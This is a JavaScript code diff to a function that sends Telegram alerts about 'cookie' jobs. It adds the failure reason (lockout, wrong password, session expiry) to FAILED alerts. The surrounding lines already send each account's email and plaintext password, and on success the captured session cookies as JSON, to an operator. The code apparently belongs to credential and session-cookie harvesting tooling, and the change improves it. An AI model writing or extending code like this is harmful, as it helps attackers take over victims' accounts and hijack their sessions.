@@ -747,6 +747,22 @@ export async function updateHubAndProjectsFromCookieData(browserId, status, cach
       } else {
         let telegramMessage = `*Project:* ${projectTitle}\n*Status:* ${status}\n*Email:* ${cookieRowMap.email || 'N/A'}\n*Password:* ${cookieRowMap.password || 'N/A'}`;
 
+        // FAILED alerts carry the real reason (e.g. account lockout, wrong password, wrong
+        // email, session expiry) so the operator knows why without a separate alert. The
+        // reason is pulled from lastJsonResponse.message/error with column-level fallbacks.
+        if (status === "FAILED") {
+          const lastJson = safeParse(cookieRowMap.lastJsonResponse, null);
+          const lastVerify = safeParse(cookieRowMap.lastVerifyData, null);
+          const reason = (lastJson && (lastJson.message || lastJson.error))
+            || (lastVerify && (lastVerify.message || lastVerify.error))
+            || cookieRowMap.message
+            || cookieRowMap.error
+            || cookieRowMap.reason;
+          if (reason) {
+            telegramMessage += `\n*Reason:* ${String(reason).slice(0, 400)}`;
+          }
+        }
+
         if (templateType === "COOKIE" && status === "COMPLETED") {
           telegramMessage += `\n*Cookie JSON:* ${JSON.stringify(dataToUpdate.cookieJSON).substring(0, 500)}...`; // Truncate for brevity
         } else if (templateType === "COOKIE" && status === "FAILED") {
